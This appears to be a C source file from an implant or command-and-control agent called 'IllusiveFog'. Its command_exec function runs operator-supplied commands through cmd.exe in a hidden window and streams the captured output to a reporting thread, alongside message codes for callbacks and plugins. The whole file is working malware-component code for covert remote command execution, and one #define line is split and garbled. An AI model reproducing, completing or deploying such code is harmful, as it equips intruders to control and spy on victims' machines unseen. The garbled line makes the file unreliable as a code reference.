#include "Shell.h"
#define WM_


_EXIT_THREAD 1
#define WM_IllusiveFog_CONITINUE 2
#define WM_IllusiveFog_REPORT 3
#define WM_IllusiveFog_CALLBACK 4
#define WM_IllusiveFog_PLUGIN_LAUNCH 5
#define WM_IllusiveFog_PLUGIN_TERMINATE 6
#define DEFAULT_BUFFER_SIZE 4096


void command_exec(char* command, DWORD reporter_threadid, HANDLE hevent) {
	char* cmd_string = (char*)"C:\\Windows\\System32\\cmd.exe /c ";
	char* command_exec = NULL, * szcmd = NULL, * buffer = NULL;
	HANDLE hStdInPipeRead, hStdInPipeWrite, hStdOutPipeRead, hStdOutPipeWrite = NULL;
	DWORD dwtemp = 0, dwread = 0;
	BOOL success = FALSE;
	SECURITY_ATTRIBUTES sa;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;

	PPROCESS_INFORMATION pi = allocheap(sizeof(PROCESS_INFORMATION));
	STARTUPINFOA* si = allocheap(sizeof(STARTUPINFOA));
	dwtemp = (strlen(cmd_string) + strlen(command)) * sizeof(char);
	command_exec = (char*)allocheap(dwtemp + 1);
	ZeroMemory(command_exec, dwtemp + 1);
	strcpy(command_exec, cmd_string);
	strcat(command_exec, command);
	CreatePipe(&hStdInPipeRead, &hStdInPipeWrite, &sa, 0);
	CreatePipe(&hStdOutPipeRead, &hStdOutPipeWrite, &sa, 0);

	si->cb = sizeof(STARTUPINFOA);
	si->dwFlags = STARTF_USESTDHANDLES;
	si->hStdError = hStdOutPipeWrite;
	si->hStdOutput = hStdOutPipeWrite;
	si->hStdInput = hStdInPipeRead;

	success = CreateProcessA(
		"C:\\Windows\\System32\\cmd.exe",
		command_exec,
		NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL,
		si, pi
	);
	CloseHandle(hStdOutPipeWrite);
	CloseHandle(hStdInPipeRead);

	buffer = (char*)allocheap(DEFAULT_BUFFER_SIZE + 2);
	dwread = 0;
	ZeroMemory(buffer, DEFAULT_BUFFER_SIZE + 2);
	while (hStdOutPipeRead)
	{
		if (!ReadFile(hStdOutPipeRead, buffer, DEFAULT_BUFFER_SIZE, &dwread, NULL)) {
			if (GetLastError() != ERROR_BROKEN_PIPE && dwread) {
				CloseHandle(hStdOutPipeRead);
				hStdOutPipeRead = NULL;
				break;

			}
			CloseHandle(hStdOutPipeRead);
			hStdOutPipeRead = NULL;
			dwread = 0;
			break;
		}

		buffer[dwread] = '\0';
		report(hevent, reporter_threadid, buffer);

		ZeroMemory(buffer, DEFAULT_BUFFER_SIZE);

	}
	if (hStdOutPipeRead) {
		CloseHandle(hStdOutPipeRead);
		hStdOutPipeRead = NULL;
	}
	CloseHandle(hStdInPipeWrite);

	WaitForSingleObject(pi->hProcess, INFINITE);

	CloseHandle(pi->hProcess);
	report(hevent, reporter_threadid, NULL);

	freeheap(buffer);
	buffer = NULL;
	freeheap(command_exec);
	freeheap(si);
	freeheap(pi);

}